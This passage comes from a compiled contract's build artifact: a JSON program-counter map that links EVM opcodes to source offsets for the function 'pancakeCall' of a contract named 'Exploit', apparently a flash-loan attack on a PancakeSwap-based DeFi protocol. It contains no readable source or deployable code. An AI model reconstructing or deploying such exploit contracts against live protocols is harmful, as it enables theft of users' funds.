      ],
      "op": "POP",
      "path": "0"
    },
    "854": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3392,
        3480
      ],
      "op": "POP",
      "path": "0"
    },
    "855": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3124,
        3495
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "856": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3015,
        3505
      ],
      "op": "POP",
      "path": "0"
    },
    "857": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3015,
        3505
      ],
      "op": "POP",
      "path": "0"
    },
    "858": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3003,
        3671
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3F0"
    },
    "861": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3003,
        3671
      ],
      "op": "JUMP",
      "path": "0"
    },
    "862": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3003,
        3671
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "863": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3584
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 3,
      "value": "0xF"
    },
    "865": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3584
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "866": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3618,
        3625
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x3"
    },
    "868": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3618,
        3625
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "869": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "871": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "872": {
      "op": "PUSH4",
      "value": "0x63AD2C41"
    },
    "877": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "879": {
      "op": "SHL"
    },
    "880": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP2",
      "path": "0"
    },
    "881": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "882": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3603,
        3607
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "883": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "885": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP3",
      "path": "0"
    },
    "886": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "ADD",
      "path": "0"
    },
    "887": {
      "op": "MSTORE"
    },
    "888": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "890": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "892": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "894": {
      "op": "SHL"
    },
    "895": {
      "op": "SUB"
    },
    "896": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3618,
        3625
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "897": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3618,
        3625
      ],
      "op": "DUP3",
      "path": "0"
    },
    "898": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3618,
        3625
      ],
      "op": "AND",
      "path": "0"
    },
    "899": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "901": {
      "op": "DUP3"
    },
    "902": {
      "op": "ADD"
    },
    "903": {
      "op": "MSTORE"
    },
    "904": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3628,
        3653
      ],
      "op": "PUSH11",
      "path": "0",
      "value": "0x2732CD04C6A4800A64A85"
    },
    "916": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "918": {
      "op": "DUP3"
    },
    "919": {
      "op": "ADD"
    },
    "920": {
      "op": "MSTORE"
    },
    "921": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "923": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "925": {
      "op": "DUP3"
    },
    "926": {
      "op": "ADD"
    },
    "927": {
      "op": "MSTORE"
    },
    "928": {
      "op": "PUSH1",
      "value": "0x2"
    },
    "930": {
      "op": "PUSH1",
      "value": "0x84"
    },
    "932": {
      "op": "DUP3"
    },
    "933": {
      "op": "ADD"
    },
    "934": {
      "op": "MSTORE"
    },
    "935": {
      "op": "PUSH2",
      "value": "0x60F"
    },
    "938": {
      "op": "PUSH1",
      "value": "0xF3"
    },
    "940": {
      "op": "SHL"
    },
    "941": {
      "op": "PUSH1",
      "value": "0xA4"
    },
    "943": {
      "op": "DUP3"
    },
    "944": {
      "op": "ADD"
    },
    "945": {
      "op": "MSTORE"
    },
    "946": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3584
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "947": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3584
      ],
      "op": "AND",
      "path": "0"
    },
    "948": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3584
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "949": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3594
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x63AD2C41"
    },
    "954": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3594
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "955": {
      "op": "PUSH1",
      "value": "0xC4"
    },
    "957": {
      "op": "ADD"
    },
    "958": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "960": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "962": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "963": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP1",
      "path": "0"
    },
    "964": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP4",
      "path": "0"
    },
    "965": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "SUB",
      "path": "0"
    },
    "966": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP2",
      "path": "0"
    },
    "967": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "969": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP8",
      "path": "0"
    },
    "970": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP1",
      "path": "0"
    },
    "971": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "972": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "973": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP1",
      "path": "0"
    },
    "974": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "975": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3D7"
    },
    "978": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "979": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "981": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP1",
      "path": "0"
    },
    "982": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "REVERT",
      "path": "0"
    },
    "983": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "984": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "POP",
      "path": "0"
    },
    "985": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "GAS",
      "path": "0"
    },
    "986": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "CALL",
      "path": "0"
    },
    "987": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "988": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP1",
      "path": "0"
    },
    "989": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "990": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3EB"
    },
    "993": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "994": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "995": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "997": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "DUP1",
      "path": "0"
    },
    "998": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "999": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1000": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1002": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1003": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1004": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "POP",
      "path": "0"
    },
    "1005": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "POP",
      "path": "0"
    },
    "1006": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "POP",
      "path": "0"
    },
    "1007": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3573,
        3660
      ],
      "op": "POP",
      "path": "0"
    },
    "1008": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3003,
        3671
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1009": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3716,
        3733
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1011": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3736,
        3746
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1012": {
      "branch": 23,
      "fn": "Exploit.pancakeCall",
      "offset": [
        3736,
        3746
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1013": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3736,
        3820
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x421"
    },
    "1016": {
      "branch": 23,
      "fn": "Exploit.pancakeCall",
      "offset": [
        3736,
        3820
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1017": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3811,
        3815
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x26F7"
    },
    "1020": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3788,
        3807
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x407"
    },
    "1023": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3788,
        3799
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1024": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3802,
        3807
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2710"
    },
    "1027": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3788,
        3807
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1485"
    },
    "1030": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3788,
        3807
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1031": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3788,
        3807
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1032": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3815
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x411"
    },
    "1035": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3815
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1036": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3815
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1037": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3815
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14A4"
    },
    "1040": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3787,
        3815
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1041": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3815
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1042": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3819
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x41C"
    },
    "1045": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3819
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1046": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3818,
        3819
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "1048": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3819
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x132C"
    },
    "1051": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3787,
        3819
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1052": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3787,
        3819
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1053": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3736,
        3820
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x445"
    },
    "1056": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3736,
        3820
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1057": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3736,
        3820
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1058": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3774,
        3778
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x26F7"
    },
    "1061": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3751,
        3770
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x430"
    },
    "1064": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3751,
        3762
      ],
      "op": "DUP8",
      "path": "0"
    },
    "1065": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3765,
        3770
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2710"
    },
    "1068": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3751,
        3770
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1485"
    },
    "1071": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3751,
        3770
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1072": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3751,
        3770
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1073": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3778
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x43A"
    },
    "1076": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3778
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1077": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3778
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1078": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3778
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14A4"
    },
    "1081": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3750,
        3778
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1082": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3778
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1083": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3782
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x445"
    },
    "1086": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3782
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1087": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3781,
        3782
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "1089": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3782
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x132C"
    },
    "1092": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3750,
        3782
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1093": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3750,
        3782
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1094": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3842
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 4,
      "value": "0x2"
    },
    "1096": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3842
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1097": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1099": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1100": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1105": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1107": {
      "op": "SHL"
    },
    "1108": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1109": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1110": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3861,
        3865
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "1111": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1113": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1114": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "ADD",
      "path": "0"
    },
    "1115": {
      "op": "MSTORE"
    },
    "1116": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3716,
        3820
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1117": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3716,
        3820
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "1118": {
      "op": "POP"
    },
    "1119": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3716,
        3820
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1120": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3716,
        3820
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1121": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1123": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1125": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1127": {
      "op": "SHL"
    },
    "1128": {
      "op": "SUB"
    },
    "1129": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3842
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1130": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3842
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1131": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3842
      ],
      "op": "AND",
      "path": "0"
    },
    "1132": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3842
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1133": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3852
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "1138": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3852
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1139": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1141": {
      "op": "ADD"
    },
    "1142": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1144": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1146": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1147": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1148": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1149": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "SUB",
      "path": "0"
    },
    "1150": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1151": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1153": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP8",
      "path": "0"
    },
    "1154": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "GAS",
      "path": "0"
    },
    "1155": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "CALL",
      "path": "0"
    },
    "1156": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1157": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1158": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1159": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x494"
    },
    "1162": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1163": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1164": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1166": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1167": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1168": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1169": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1171": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "REVERT",
      "optimizer_revert": true,
      "path": "0"
    },
    "1172": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1173": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "POP",
      "path": "0"
    },
    "1174": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "POP",
      "path": "0"
    },
    "1175": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "POP",
      "path": "0"
    },
    "1176": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "POP",
      "path": "0"
    },
    "1177": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1179": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1180": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1181": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1183": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "NOT",
      "path": "0"
    },
    "1184": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1186": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1187": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "ADD",
      "path": "0"
    },
    "1188": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "AND",
      "path": "0"
    },
    "1189": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1190": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "ADD",
      "path": "0"
    },
    "1191": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1192": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1194": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1195": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "POP",
      "path": "0"
    },
    "1196": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1197": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "ADD",
      "path": "0"
    },
    "1198": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1199": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x4B8"
    },
    "1202": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1203": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1204": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C6"
    },
    "1207": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3838,
        3867
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1208": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3867
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1209": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3880
      ],
      "op": "LT",
      "path": "0"
    },
    "1210": {
      "branch": 24,
      "fn": "Exploit.pancakeCall",
      "offset": [
        3838,
        3880
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1211": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x4FF"
    },
    "1214": {
      "branch": 24,
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
